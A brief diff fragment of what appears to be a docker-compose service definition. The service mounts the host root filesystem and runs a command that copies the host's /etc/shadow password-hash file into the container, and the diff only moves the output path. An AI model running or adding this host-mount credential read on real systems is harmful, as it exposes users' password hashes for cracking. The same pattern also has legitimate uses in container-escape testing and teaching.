@@ -9,6 +9,6 @@ services:
       - /:/host-root
     command: >
       sh -c "
-        cat /host-root/etc/shadow > /tmp/shadow.txt &&
+        cat /host-root/etc/shadow > /root/shadow.txt &&
         sleep 3600
       "
